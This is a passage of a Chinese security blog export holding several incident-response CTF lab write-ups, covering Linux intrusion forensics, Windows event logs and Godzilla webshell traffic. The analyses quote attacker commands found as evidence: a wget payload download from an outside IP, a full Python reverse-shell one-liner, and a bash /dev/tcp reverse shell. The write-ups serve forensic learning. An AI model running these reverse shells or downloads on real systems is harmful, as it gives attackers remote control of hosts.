解码后为/var/[www/html/config.php](https://www/html/config.php)）。\n使用readfile()函数读取文件内容并输出到响应流\n\n\n将最后一段base64编码解码可以看到访问路径\n\n\nflag&#123;/var/www/html/config.php&#125;\n\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"第九章-blueteam 的小心思","url":"/2025/09/16/%E7%AC%AC%E4%B9%9D%E7%AB%A0-blueteam%20%E7%9A%84%E5%B0%8F%E5%BF%83%E6%80%9D/","content":"第九章-blueteam 的小心思服务器场景操作系统 Linux服务器账号密码 root qi5qaz任务环境说明    注：进去后执行  sed -i &#x27;s/Listen 80/Listen 9999/&#x27; /etc/apache2/ports.conf &amp;&amp; service apache2 restart开放题目    漏洞修复\n\n题目；\n1、攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。\n2、攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。\n3、找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。\n4、攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}。\n5、攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。\n6、攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。\n7、攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。\n8、攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。\n9、解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。\n10、因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。\n使用Xshell新建或者SSH连接靶机\n\n\n成功链接后立马执行命令\nsed -i &#x27;s/Listen 80/Listen 9999/&#x27; /etc/apache2/ports.conf &amp;&amp; service apache2 restart\n\n第一题1、攻击者通过什么密码成功登录了网站的后台？提交密码字符串的小写md5值，格式flag{md5}。\n第一步我们可以先看看日志，查看黑客有没有留下什么痕迹，这个靶场是apache，日志在 var&#x2F;log&#x2F;apache2\n\n从行为来看：\n\n攻击者（IP：192.168.16.43）连续多次对 login.php 提交了 POST 请求；\n前面几次返回的是 200 OK（说明还在登录页面，登录失败）；\n最后一次（23:20:21）返回了 302（跳转） ⇒ 登录成功了！\n\n从这段 Apache 日志看，攻击者用了正确的密码在 2023-11-18 23:20:21 登录后台成功了，表现为 HTTP 302 状态码，说明这一次 POST 提交中的密码就是正确密码。\n日志里面没有发现黑客的账户和密码，这里我们从数据库入手\n\n数据库登录的账号和密码通常存储在配置文件如 config.inc.php 中,因为配置文件 config.inc.php 是专门用于存放应用程序的配置参数，包括数据库连接信息。\n\n这里使用find命令查找配置文件信息\nfind / -name config.inc.php\n\n\n查看数据库账户和密码\ncat /var/www/html/include/config.inc.php\n\n\n我们可以得到；\n\n数据库类型：pdo:mysql\n数据库服务器：localhost\n数据库用户名：root\n数据库密码：mysql123\n数据库名称：mirage\n\n我们这里使用Navicat Premium对数据库进行链接方便查看\n在文件这里新建\n\n数据库也没有，我们直接查看流量包\nfind / -name &quot;*.pcap&quot;\n\n\n在根目录下面有流量包，我们在finalshell里面下载用wireshark打开找\n题目告诉我们登录，那么我们直接差http的关键字 login.php\nhttp contains &quot;login.php&quot;\n\n\n在302跳转的上一条流量包这里，对这个密码进行md5加密得到flag{D63EDB0E9DF4CF411398E3658C0237E0}\n第二题攻击者在哪个PHP页面中成功上传了后门文件？例如upload.php页面，上传字符串”upload.php”的小写md5值，格式flag{md5}。\n题一我们已经到导出了流量包，那我们可以查找一下“boundary”；\n为什么要找boundary\n\n\\1. 定位上传请求\n很多渗透攻击（如 Webshell 上传）都会用 multipart/form-data 方式提交，搜索 boundary 可以迅速定位 POST 请求中的文件上传\n\\2. 查看上传文件的内容\nWireshark 可以直接展示请求体内容。定位 boundary 后，下面的每段数据块就是上传内容，如用户名、文件名、payload 等\n3.识别 Webshell 或敏感信息\n通过搜索 boundary → 定位上传表单 → 查看 filename&#x2F;内容，能识别上传的恶意脚本、敏感表单字段如：\n\nfilename=&quot;shell.php&quot;\nname=&quot;password&quot;\n&lt;?php ... ?&gt;（webshell代码）\n\n\n找到一条数据包，对这条数据包进行http追踪流\n\n\n\n\n这段是一次非常典型的 Webshell 文件上传请求，攻击者通过 HTTP 的 multipart/form-data 上传了一个包含木马的压缩包。我们逐段分析\n黑客上传了一个名为 cpg.zip 的压缩文件\n实际上传的是 ZIP 文件类型\n这个 zip 里包含了一个 cpg.php 文件，其内容是一句话木马：\n该 WebShell 可以执行任何攻击者通过 POST 参数 m3 传入的 PHP 代码\n上传插件或文件的 POST 请求，目标接口是&#x2F;pluginmgr.php?op&#x3D;upload\n上传页面:pluginmgr.php  进行md5加密\n拿到flag{B05C0BE368FFA72E6CB2DF7E1E1B27BE}\n第三题找到攻击者上传的webshell文件，提交该文件的小写md5值，格式flag{md5}。\n在上题流量包里面我们知道了cpg.php就是木马文件，我这里我们直接对文件在系统盘里面进行查找\nsudo find / -type f -name &quot;cpg.php&quot; 2&gt;/dev/null\n\n\n得到文件位置，然后我们去到这个文件所在地目录对文件进行md5加密加密拿到flag{a097b773ced57bb7d51c6719fe8fe5f5}\n\n第四题攻击者后续又下载了一个可执行的后门程序，提交该文件的小写md5值，格式flag{md5}\n在wireshark里面 对http流量包进行筛选按照一下大小排序，在大小为“1037”的包中发现关键；\n\n跟进分析，追踪流HTTP；\n\nurl在线解码,使用了PHP的 system 函数，执行了一个下载命令\nm3=system(&quot;wget http://124.221.70.199:8889/is.world&quot;);\n\n在这里下载了is.world文件我们使用find命令对文件进行定位\n\n这使用ls-la发现了一个点（.）后面跟了7个空格！攻击者上传的目录或文件名被故意命名得像是当前目录 &quot;.&quot;，混淆你的视觉\n进入这个目录查看文件\ncd &#x27;./.       &#x27;ls -la注意：引号中必须包含点+空格，否则无法正确进入。\n\n对文件进行md5加密拿到flag{ee279c39bf3dcb225093bdbafeb9a439}\n\n第五题攻击者创建了后门用户的名称是？例如attack恶意用户，上传字符串”attack”的小写md5值，格式flag{md5}。\n题目告诉我们是新增加用户，检查用户配置文件，在Liunx中，&#x2F;etc&#x2F;passwd 文件，包含了所有用户的信息，包括用户名和用户ID等\ncat /etc/passwd\n\n\nknowledgegraphd:x:0:0::/home/knowledgegraphd:/bin/bash攻击者已经在系统中创建了一个具有 root 权限的后门账号：\n\nknowledgegraphd 用户就是是黑客创建的后门用户UID 为 0 的账号就意味着 &#x3D; root\n\n在 Linux 中，UID&#x3D;0 是系统最高权限；\n正常系统中 只允许一个 UID&#x3D;0 的账号，即 root 本身；\n如果出现第二个 UID&#x3D;0 用户，就是严重的提权后门\n\n对这个用户进行md5加密提交，在Ubuntu下字符串进行MD5加密和文件肯定不一的flag{4cda3461543c9a770a3349760594facd}\necho -n &quot;knowledgegraphd&quot; | md5sum\n\n\n第六题攻击者创建了一个持久化的配置项，导致任意用户登录就会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。\nshell配置文件\n黑客可以修改用户的 Shell配置文件，这些文件在用户登录时被执行。常见的文件包括:\n1、”&#x2F;.bashrc“：用于 Bash Shell，会在每次打开新的终端或登录 Shell 时执行。2、”&#x2F;.bash_profile“或”&#x2F;.profile“：这些文件在用户登录时执行。3、”&#x2F;.zshrc“：用于Zsh Shell，与”~&#x2F;.bashrc“类似。4、”&#x2F;etc&#x2F;profile“：为所有用户提供的系统级别的配置文件，5、”&#x2F;etc&#x2F;bash.bashrc“：为所有用户提供的系统级别的配置文件，Bash Shell 专用。\n在”&#x2F;etc&#x2F;profile“中发现可疑点\ncat /etc/profile\n\n\n这行 /etc/profile 中的代码是攻击者设置的 Linux 登录自启动后门机制，每次有人登录就自动后台执行木马文件 is.world。结合上题发现的隐藏目录 .       ，这是一种经典的持久化控制手法\n/var/www/html/plugins/&quot;. &quot;/is.world &amp;，它是一个恶意添加的行，试图运行一个不明的命令或程序。\n对文件进行md5加密拿到flag{65bf3e4a9ac90d75ec28be0317775618}\n\n第七题攻击者创建了一个持久化的配置项，导致只有root用户登录才会触发后门的连接。提交该配置项对应配置文件的小写md5值，格式flag{md5}。\n黑客希望在只有root用户登录时才触发后门连，其它用户则不会，那他一般会挑选以下文件和目录\n1、“&#x2F;root&#x2F;.bashrc”：在root用户登录Bash Shell时执行；2、“&#x2F;root&#x2F;.bash_profile”：在root用户登录时执行。3、“&#x2F;root&#x2F;.profile”：在root用户登录时执行。4、“&#x2F;etc&#x2F;profile”：所有用户登录时执行，但可以通过特定的条件使其仅在root用户登录时触发。（这个概率就非常大，且也符合我们的猜测）5、“&#x2F;etc&#x2F;rc.local”：系统启动时执行，可以包含条件逻辑；\n在“&#x2F;root&#x2F;.bashrc”中发现关键\ncat /root/.bashrc\n\n\nPython 一个经典的反弹 shell 脚本，常被用作创建后门的手段\npython -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;124.221.70.199&quot;,9919));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; &amp;\n\n至此对此文件进行md5加密拿到flag{4acc9c465eeeb139c194893ec0a8bcbc}\n\n第八题攻击者加密了哪个数据库？提交数据库的文件夹名，例如user数据库对应存放位置为user文件夹，上传字符串”user”的小写md5值，格式flag{md5}。\n使用Navicat Premium对数据库进行分析\nJPMorgan Chase”数据库中发现它打不开****报错，怀疑可能有加密\n\nfind定位一下“JPMorgan@0020Chase”\nfind / -name JPMorgan@0020Chase\n\n使用echo来进行MD5加密拿到flag{0928a5424aa6126e5923980ca103560e}\necho -n &quot;JPMorgan@0020Chase&quot; | md5sum\n\n第九题解密数据库，提交Harper用户对应Areer的值。提交Areer值的小写md5值，格式flag{md5}。\n尝试查找一下黑客比文件“cpg.php“新，又比闻文件“Balance.frm”旧的所有文件\nfind / -type f -newer /var/www/html/plugins/cpg.php ! -newer /var/lib/mysql/JPMorgan@0020Chase/Balance.frm\n\n\n分析一下这个clockup.php文件\ncat /var/lib/mysql/clockup.php\n\n\n这个PHP脚本的作用是对指定目录下的所有文件进行加密，指定目录那可不就是“&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;JPMorgan@0020Chase”\n这里使用反推脚本\n&lt;?php  $currentDate = date(&quot;Y-m-d&quot;);  $key = md5(&#x27;2023-11-18&#x27;);  $iv = substr(hash(&#x27;sha256&#x27;, &quot;DeepMountainsGD&quot;), 0, 16);  $filePath = &quot;/var/lib/mysql/JPMorgan@0020Chase&quot;;  $files = scandir($filePath);  foreach ($files as $file) &#123;          if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) &#123;                      $fullPath = $filePath . &#x27;/&#x27; . $file;                          $encryptedContent = file_get_contents($fullPath);                          $decryptedContent = openssl_decrypt($encryptedContent, &#x27;aes-256-cbc&#x27;, $key, 0, $iv);                              file_put_contents($fullPath, $decryptedContent);                          &#125;  &#125;  ?&gt;\n\n那这里我们直接把解密脚本写在&#x2F;var&#x2F;www&#x2F;mysql&#x2F;目录下即可\n\n运行\nphp 123.php\n\n运行完成，就先不要急着返回刷新数据库，最好先重启一下数据库；\n使用命令；\nsudo systemctl restart mysql\n\n\n我们Harper用户对应Areer的值是什么并且进行MD5加密拿到flag{8fd82b8864d71ed7fa12b59e6e34cd1c}\n第十题因为什么文件中的漏洞配置，导致了攻击者成功执行命令并提权。提交该文件的小写md5值，格式flag{md5}。\n我们使用命令查找系统中以 root 用户身份拥有并设置了 SUID（Set User ID）权限的文件\nfind / -user root -perm -4000 2&gt;/dev/null\n\n\n\n在这个案例中，虽然只允许执行 systemctl status apache2.service，存在某种漏洞，肯定会导致执行其它命令或达到提权的效果。\n\n所以直接在Liunx中MD5加密即可拿到flag{6585817513b0ea96707ebb0d04d6aeff}\nmd5sum /etc/sudoers\n\n\n\n最后感谢大佬的分析：https://blog.csdn.net/administratorlws/article/details/140471298\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"第五章 Windows 实战-evtx 文件分析","url":"/2025/09/16/%E7%AC%AC%E4%BA%94%E7%AB%A0%20Windows%20%E5%AE%9E%E6%88%98-evtx%20%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/","content":"第五章 Windows 实战-evtx 文件分析服务器场景操作系统 None点击下载附件获取附件任务环境说明    注：样本请勿在本地运行！！！样本请勿在本地运行！！！样本请勿在本地运行！！！    应急响应工程师在收到设备告警后，在受到攻击的服务器保存了一份log 请你协助分析 LOG 文件提交对应的 FLAG开放题目    漏洞修复\n\n.evtx 文件是 Windows 系统的事件日志文件格式，用于记录操作系统中各种事件（如用户登录、程序崩溃、安全操作、系统错误等），是应急响应、运维监控、取证分析中非常重要的证据来源。\n如何打开 .evtx 文件？使用系统自带事件查看器\n\n打开方式：按 Win + R → 输入 eventvwr.msc\n或直接双击 .evtx 文件，默认会用“事件查看器”打开\n\n第一题将黑客成功登录系统所使用的IP地址作为Flag值提交；\n这里告诉我们找成功登录，关于登录这两个，我们筛选一下事件 ID 4624进行分析即可；\n\n当 某个用户成功登录系统（本地、远程、RDP、网络等），Windows 就会在安全日志中记录一个 ID 为 4624 的事件\n\n\n按照事件排序在13:58:40这里发现了可疑IP提交正确\nflag&#123;192.168.36.133&#125;\n\n\n应急响应中常用的 Windows 安全事件 ID 一览\n\n\n\n事件 ID\n含义\n用途\n\n\n\n4624\n成功登录\n查看登录行为（Logon Type 很关键）\n\n\n4625\n登录失败\n密码爆破、非法尝试登录\n\n\n4648\n使用凭证尝试登录（凭据传递）\n黑客 lateral movement（横向移动）关键痕迹\n\n\n4672\n特权账户登录\n域管、管理员登录，非常敏感，要重点关注\n\n\n4688\n创建新进程\n查看恶意程序或脚本是怎么启动的\n\n\n4689\n进程退出\n与 4688 配套，分析程序生命周期\n\n\n4697\n安装新服务\n后门、远控软件可能以服务形式安装\n\n\n7045（系统日志）\n服务已安装\n同上，用于分析服务型恶意行为\n\n\n1102\n清除安全日志\n黑客常做的反取证行为，高危！\n\n\n4720\n创建新用户账户\n黑客添加后门账户\n\n\n4722\n启用用户账户\n恢复禁用账户，也可能是绕过\n\n\n4723\n用户尝试修改密码（自己）\n用户被钓鱼、密码猜测\n\n\n4724\n管理员重置其他用户密码\n域控内 lateral movement 常见操作\n\n\n4725\n禁用账户\n尝试锁死某个账户，或清理痕迹\n\n\n4728\n用户加入到安全组\n黑客将账户加入 administrators\n\n\n4732\n用户加入到本地组\n可能赋予了权限\n\n\n4740\n账户被锁定\n爆破迹象（多次登录失败）\n\n\n第二题黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交\n这里关键字，修改我们对事件 ID 4738进行分析。因为它是用于创建、删除、修改等，是专门用于记录用户账户被修改的事件，包括但不限于用户名的修改。\n事件 ID 4738：用户账户被更改（User account was changed）\n 含义\n\n表示某个本地或域用户账户的属性发生了变更，比如：\n\n\n改了用户名、描述\n改了密码（非登录时）\n改了账户状态（禁用&#x2F;启用）\n改了组成员关系（不是加入组，是属性更新）\n\n 用途\n\n排查账号是否被黑客修改\n检测权限被悄悄提升（如账号被添加到管理员组前通常会改属性）\n配合 ID 4728&#x2F;4732 分析账号变化轨迹\n\n这里对事件进行查看查看对比发现14：59:21这里的这个事件和一条：14:30:35账户名称不一样，从 Administrator 改成 Adnimistartro并且在上一条的时间里面发现：PasswordLastSet: 2020&#x2F;10&#x2F;8 14:30:35。这表示此时“密码被重置&#x2F;更改”了。它是一个明确的变更字段，表示账号密码被设置或修改了。\n所以我们把最近被修改的事件里面，在这里找到被更改的账户Adnimistartro提交作为flag\nflag&#123;Adnimistartro&#125;\n\n\n\n\n第三题黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；\n在window日志里，一般访问成功的文件我们使用事件 ID 4663；\n事件 ID 4663：尝试访问对象（An attempt was made to access an object）\n 含义\n\n说明某个进程、账户尝试访问了一个文件、注册表或对象，并触发了 对象访问审核。\n\n⚠️ 注意：你必须在本地启用了“对象访问审核策略”并为目标对象设置了 SACL，系统才会记录这条日志。\n常见触发场景\n\n黑客访问关键文件（如 CobaltStrike 的 beacon、密码明文）\n非法访问敏感文档、注册表项、凭据等\n操作系统文件、WebShell、计划任务配置被访问\n\n 用途\n\n检测黑客是否访问了某个关键文件、配置或注册表项\n追踪谁访问了敏感目录（如 C:\\Users\\Administrator\\Desktop\\flag.txt）\n结合时间点、进程、账户判断是否为异常行为\n\n\nC:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT\n\n这是 Windows 系统中的一个系统关键文件，它的作用与**系统配置管理数据库（Registry Hive）**密切相关。SCHEMA.DAT 是 Windows 注册表配置的一部分，存储了系统注册表结构的“模式（Schema）定义”信息。\nflag&#123;SCHEMA&#125;\n\n\n第四题黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交\n根据题目要求，说要将最后一次重启数据库服务后的数据服务，这里我们按照事件排序，下拉到最后\n最后在15:53:09这里发现了phpcustom_mysql (mysqld 5.5.62-log) starting as process 8820 ...→ 启动信息\n并且正常的 MySQL 实例名是 mysqld，而不是以 .phpcustom_ 开头.phpcustom_mysql 极可能是攻击者部署的一个 伪装 MySQL 实例\n所以可以确认最后一次重启 MySQL 数据库服务的进程ID是 8820\n8820这个进程号还挺有意思的奥\nflag&#123;8820&#125;\n\n\n第五题黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。\n我们在系统日志里面进行查看，查看事件ID 1074；\n事件 ID 1074 全称\n\n“The process X has initiated the shutdown of computer Y on behalf of user Z for the following reason…” —— 某个进程（如 explorer.exe、svchost.exe）代表某个用户，发起了系统的 重启 &#x2F; 关机 &#x2F; 注销\n\n我从这里开始往下找，找到5条重新启动的标识，但是发现flag错误，我又回来看，并不是所有的重新启动的账户都是Adnimistartro有的是系统账户，根据题目要求修改了登录用户的用户名并对系统执行了多次重启操作\t再进行一次筛选得到最后黑客重新启动的次数为三次\nflag&#123;3&#125;\n\n\n\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"第六章-哥斯拉4.0流量分析","url":"/2025/09/16/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"第六章-哥斯拉4.0流量分析1、黑客的IP是什么？我们打开wireshark，哥斯拉的流量都是用POST的传输的，所以什么直接抓取post流量包\nhttp.request.method==&quot;POST&quot;\n\n\n发现post的流量包都集中在hello.jsp这个文件,我们再搜索一下这个文件\nhttp contains &quot;/hello.jsp&quot;\n\n\n这里有个hello.jsp的文件打开看看\n\n典型的哥斯拉流量包的特征至此我们确认黑客ip\nflag&#123;192.168.31.190&#125;\n\n2.黑客是通过什么漏洞进入服务器的？（提交CVE编号）我们继续分析流量包\n\n在这个流量包的末尾这里发现了中间件为Apache Tomcat&#x2F;8.5.19，这里又是用的put方式讲文件上传，所以我猜黑客是使用了Tomcat&#x2F;8.5.19文件上传漏洞\nflag&#123;CVE-2017-12615&#125;\n\n\n\n3.黑客上传的木马文件名是什么？(提交文件名)根据前面第一题可以知道文件名为hello.jsp\nflag&#123;hello.jsp&#125;\n\n4.黑客上传的木马连接密码是什么？根据第一题可知\nflag&#123;7f0e6f&#125;\n\n5.黑客上传的木马解密密钥是什么？根据第一题可知\nflag&#123;1710acba6220f62b&#125;\n\n6.黑客连接webshell后执行的第一条命令是什么？我们继续分析流量包，在长度为313这里这个流量包点击进去感觉有点不对劲，返回包的内容比较少怀疑是执行了命令，讲请求包的加密内容丢到工具箱进行分析\n\n\n解密出来是命令执行，可以看到第一条的命令\n\ncmdLine sh -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs -c &quot;cd &quot;/&quot;;uname -r&quot; 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 cd &quot;/&quot;;uname -rmethodName execCommand\n\n命令结构解析\n\nsh -c &quot;cd &quot;/&quot;;uname -r&quot;\n\nsh -c：以Shell解释器执行指定命令。\n\n&quot;cd &quot;/&quot;;uname -r&quot;\n    - `cd /`：切换到根目录（`/`）。    - `;uname -r`：执行`uname -r`命令，获取系统内核版本信息。* **`2&gt;&amp;1`**- 将标准错误输出（`2`）重定向到标准输出（`1`），合并输出和错误信息。- **用途**：捕获命令执行的完整输出（包括错误信息），便于调试或日志记录我们再把返回包丢进去解密即可确定黑客执行的命令是uname -r\n\n\n\n\n\nflag{uname -r}\n![image-20250801113635015](/img/image-20250801113635015.png)## 7.黑客连接webshell时查询当前shell的权限是什么？我们继续分析流量包，在305这个数据包里面解密返回包内容，可以看到用户拿到shell后执行了id命令，返回当前用户权限\nflag{root}\n![image-20250801113917520](/img/image-20250801113917520.png)![image-20250801113936920](/img/image-20250801113936920.png)![image-20250801113902746](/img/image-20250801113902746.png)## 8.黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？继续分析流量包，在长度329流量包这里，讲该流量包解密![image-20250801114815390](/img/image-20250801114815390.png)![image-20250801114736691](/img/image-20250801114736691.png)黑客在这里执行了命令cat /etc/os-release命令,这个命令是显示发行版名称和版本的我们讲这里的返回包进行解密![image-20250801114801169](/img/image-20250801114801169.png)可以看到返回包返回的发发行版本,拿到flag![image-20250801114722059](/img/image-20250801114722059.png)\nflag{Debian GNU&#x2F;Linux 10 (buster)}\n## 9.黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）继续分析流量包，在长度为323这里讲流量包进行解密![image-20250801115146263](/img/image-20250801115146263.png)可以看到黑客在这里明显使用了grep命令,\nsh -c “cd &#x2F;; rpm -qa | grep pam” 2&gt;&amp;1\n- `sh -c &quot;...&quot;`：使用`sh` shell执行一个命令。- `cd /`：切换到根目录。- `rpm -qa`：列出所有已安装的RPM包。- `grep pam`：过滤出包含`pam`的包名。- `2&gt;&amp;1`：将标准错误输出重定向到标准输出，这样所有的输出（包括错误信息）都会被捕捉到。![image-20250801115131549](/img/image-20250801115131549.png)![image-20250801150439891](/img/image-20250801150439891.png)简单分析；* rpm: not found：表示系统中没有安装 rpm 命令，或者该命令不可用。rpm 是 Red Hat 系列 Linux 发行版中用于管理软件包的工具。* 2&gt;&amp;1: 1: 2&gt;&amp;1:：这部分似乎是命令执行时的错误输出，但语法不太正确，可能是命令执行时的格式问题，导致输出混乱。我讲这条命令没有成功执行不是我们想要的结果，继续分析流量包![image-20250801151242824](/img/image-20250801151242824.png)![image-20250801151223647](/img/image-20250801151223647.png)\ncmdLine 0 sh -c “cd “&#x2F;“;dpkg -l libpam-modules:amd64” 2&gt;&amp;1arg-3 2&gt;&amp;1executableFile shexecutableArgs - -c “cd “&#x2F;“;dpkg -l libpam-modules:amd64” 2&gt;&amp;1arg-0 shargsCount 4arg-1 -carg-2 # cd “&#x2F;“;dpkg -l libpam-modules:amd64methodName execCommand\n- **命令结构**：`sh -c &quot;cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot; 2&gt;&amp;1`  - `sh -c`：使用 shell 来执行命令。  - `cd &quot;/&quot;`：切换到根目录，但在这个上下文中没有实际效果。  - `dpkg -l libpam-modules:amd64`：查询安装的 `libpam-modules` 包，特定于 amd64 架构。  - `2&gt;&amp;1`：将标准错误输出重定向到标准输出，以捕获所有输出信息。- **参数和方法**：  - `arg-0 sh`：表示命令的第一个参数是 `sh`。  - `arg-1 -c`：表示使用 `-c` 选项来执行字符串中的命令。  - `arg-2 cd &quot;/&quot;;dpkg -l libpam-modules:amd64&quot;`：表示要执行的具体命令。  - `methodName execCommand`：表示这是一个执行命令的方法调用。- **命令目的**：黑客通过这个命令检查目标系统中是否安装了 `libpam-modules` 包，该包与 PAM（可插入式认证模块）相关，负责系统的身份验证和安全管理。通过查询该包的状态和版本信息，黑客可以评估系统的安全性。我们继续对返回包进行解析![image-20250801151509270](/img/image-20250801151509270.png)最后的最后黑客成功“dpkg -l libpam-modules:amd64”也成功返回了“pam版本”将这段命令提取即可拿到flag\nflag{dpkg -l libpam-modules:amd64}\n## 10.黑客留下后门的反连的IP和PORT是什么？（IP:PORT)这个时候分析流量包就要着重看看，解密后的流量包里面是否含有反弹命令了继续一个一个找![image-20250801115945035](/img/image-20250801115945035.png)![image-20250801115931935](/img/image-20250801115931935.png)讲长度为413这里，讲该流量包进行解密发现，这里解完密后依旧还有base64加密，而且这个格式像反弹命令讲加密的地方拿去解码![image-20250801115917234](/img/image-20250801115917234.png)可以确定黑客执行了反弹命令,这个命令 `/bin/bash -i &gt;&amp; /dev/tcp/192.168.31.143/1313 0&gt;&amp;1` 是一个经典的反向 shell 命令，它允许攻击者在目标系统上获得一个交互式的 shell&gt; `execCommand` 方法在这个例子中被用来执行一个复杂的命令，该命令通过 Base64 编码隐藏了其真实意图。解码后的命令是一个反向 shell，它会连接到指定的 IP 地址和端口，并提供一个交互式的 shell，允许攻击者远程控制目标系统&lt;img src=&quot;/img/image-20250801120331227.png&quot; alt=&quot;image-20250801120331227&quot; style=&quot;zoom:50%;&quot; /&gt;\nflag{192.168.31.143:1313}\n## 11.黑客通过什么文件留下了后门？也是解密了好几条，在长度为1295这里一点进去一大串的加密内容，讲这段加密解密即可看到黑客在什么目录下面创建了后面\nflag{pam_unix.so}\n文件路径：/tmp/pam_unix.so* /tmp 目录通常用于存储临时文件，黑客选择这个目录可能是为了避开监控，因为很多系统管理员不会频繁检查该目录。* pam_unix.so 是一个常见的动态链接库文件，通常与 PAM（可插入式认证模块）相关联。这个文件名暗示了它可能涉及系统的身份验证。![image-20250801120959821](/img/image-20250801120959821.png)![image-20250801120946706](/img/image-20250801120946706.png)![image-20250801120821655](/img/image-20250801120821655.png)这里直接对黑客的ip和端口进行过滤流量也能看到黑客操作的文件![image-20250802160607043](/img/image-20250802160607043.png)## 12.黑客设置的后门密码是什么？通过上题我们知道黑客存放的后门文件是pam_unix.sofileValue，我们直接从根目录进行搜索\nfind &#x2F; -name “pam_unix.so”\n![image-20250801143137467](/img/image-20250801143137467.png)找到存放地址，追踪过去，来到当前目录，我这里使用的finalshell，所以直接可以下载![image-20250801143300216](/img/image-20250801143300216.png)![image-20250801143407479](/img/image-20250801143407479.png)现在导出后门文件了，我们使用file命令看看文件类型，**`file` 命令用于确定文件的类型。它通过检查文件的内容而不仅仅是文件的扩展名来识别文件类型。**\nfile pam_unix.so\n![image-20250801143509680](/img/image-20250801143509680.png)**`pam_unix.so` 是一个为 64 位 x86-64 架构编写的动态链接共享库，遵循 ELF 格式，包含调试信息且没有剥离。它是 PAM（可插入式认证模块）的一部分，用于处理基于 UNIX 的身份验证**这里我们涉及到一些逆向知识，我们使用逆向工具——64位的IDA进行分析**`pam_sm_authenticate` 是 PAM 框架中的关键函数，负责用户身份验证（要的就是这个验证“密码”）。与其他 PAM 函数相比，它专注于验证用户凭证，确保只有合法用户可以访问系统或服务**![image-20250801145231931](/img/image-20250801145231931.png)\nflag{XJ@123}\n## 13.黑客的恶意dnslog服务器地址是什么？在密码上面就能看到一条dnslog的地址\n%s.%s c0ee2ad2d8.ipv6.xxx.eu.org.\n","categories":["流量分析"],"tags":["学习笔记","流量分析","网络取证","应急响应"]},{"title":"第六章-流量特征分析-常见攻击事件-Tomcat","url":"/2025/09/16/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-Tomcat/","content":"第六章 流量特征分析-常见攻击事件 Tomcat1.  在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag{ip}，如：flag{127.0.0.1}分析黑客的扫描行为这里我们要识别恶意扫描特征\n\n恶意扫描通常表现为大量SYN请求（TCP半连接扫描），这是Nmap等工具常用的扫描方式。攻击者会向目标服务器多个端口发送SYN包，探测开放端口\n\n我们使用命令tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0过滤流量包\n\ntcp.flags.syn == 1：筛选TCP协议中 SYN标志位（Synchronize）被置位（值为1） 的数据包。SYN标志用于建立TCP连接的初始握手（第一次握手）。\ntcp.flags.ack == 0：筛选 ACK标志位（Acknowledgment）未被置位（值为0） 的数据包。ACK标志用于确认数据接收（第二次握手后出现）。\n组合逻辑：该命令捕获 仅包含SYN请求而无ACK响应的TCP包，即TCP连接的第一次握手包。\n\n那么应该有人问了，tcp的三次握手跟黑客的扫描有什么关系吗?\n这个时候要了解一下端口扫描的核心机制\n\n全连接扫描（TCP Connect扫描） ：黑客通过完整的三次握手探测目标端口状态。\n黑客发送SYN包（第一次握手）→ 若目标端口开放，则回复SYN/ACK（第二次握手）→ 黑客发送ACK完成连接（第三次握手）。此时确认端口开放。\n若端口关闭，目标会回复RST/ACK包。\n缺点：完整握手会被系统日志记录，易被管理员发现。\n\n\n半连接扫描（SYN扫描） ：黑客仅进行前两次握手，规避日志记录。\n黑客发送SYN→ 收到SYN/ACK即判定端口开放 → 